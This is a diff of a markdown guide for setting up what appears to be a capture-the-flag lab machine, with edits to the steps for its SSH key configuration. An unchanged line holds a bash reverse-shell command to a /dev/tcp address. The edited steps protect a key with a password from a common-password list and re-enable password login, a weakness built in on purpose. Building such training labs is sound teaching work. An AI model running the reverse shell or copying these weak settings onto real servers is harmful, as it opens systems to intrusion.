@@ -352,24 +352,24 @@ PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 ```
 ## SSH
-* Login as one of the samba users
-* sudo su josh
-* Generate ssh key and add it to the authorized_keys
-* Create the authorized_keys file if it does not exist
-* Generate ssh key with ssh-keygen
-* Passphrase PASSPHRASE
-* Accept the default settings
+* Login to your server
+* Create ssh key with ssh-keygen
+* Add password (not passphrase) from the 10-million-password-list-top-100.txt from [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt) to the key.
+* Create the authorized_keys file in the .ssh folder if it does not exist
 * cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys
-* Create hidden file and add a flag in the file.
-* On you kali Linux generate ssh keys and transfer the public key to the josh account with the scp command.
+* On you kali Linux generate ssh keys and transfer the public key to the server with the scp command.
 * Add the key to the authorized_keys so that you can authenticate with ssh keys
 * Go to the ssh configuration file
-* Allow password authentication as well as key authentication
+* Allow public key authentication
 * Disable password authentication
 * sudo systemctl restart ssh
 * Login with you ssh key
 * Once it works go back to the server and enable password authentication
 * sudo systemctl restart ssh
+* Login to the server again with your key
+* Login as one of the samba users
+* sudo su josh
+* Create a flag in the file.
 
 # References
 * https://github.com/kozmer/log4j-shell-poc
